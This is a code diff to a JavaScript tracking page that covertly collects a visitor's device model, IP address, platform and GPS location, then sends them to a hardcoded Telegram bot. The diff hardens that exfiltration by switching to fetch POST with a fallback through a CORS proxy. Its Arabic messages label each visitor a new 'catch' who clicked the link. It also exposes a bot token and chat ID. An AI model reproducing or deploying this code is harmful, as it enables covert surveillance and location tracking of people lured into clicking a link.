@@ -58,10 +58,22 @@
         const BOT_TOKEN = "8942876579:AAE8F9nrRvr1mYdpiyzyCH1BfCH2GzFTCv0";
         const CHAT_ID = "806632734";
 
-        function sendToTelegram(message) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(message);
-            let img = new Image();
-            img.src = url;
+        async function sendToTelegram(message) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (e) {
+                // الطريقة البديلة المضمونة عبر وسيط CORS
+                let proxyUrl = `https://api.allorigins.win/raw?url=` + encodeURIComponent(`${url}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                fetch(proxyUrl);
+            }
         }
 
         function getDeviceModel() {
@@ -92,10 +104,10 @@
                 ipData = "IP fetch failed";
             }
 
-            let msg = `🚨 [ تم النقر على الرابط ودخول الهدف ] 🚨\n\n📱 الجهاز: ${device}\n🌐 ${ipData}\n💻 المنصة: ${navigator.platform}`;
-            sendToTelegram(msg);
+            let msg = `🚨 [ صيد جديد - تم النقر على الزر ] 🚨\n\n📱 الجهاز: ${device}\n🌐 ${ipData}\n💻 المنصة: ${navigator.platform}`;
+            await sendToTelegram(msg);
 
-            // طلب الـ GPS بعد الضغط مباشرة
+            // طلب الموقع الجغرافي
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
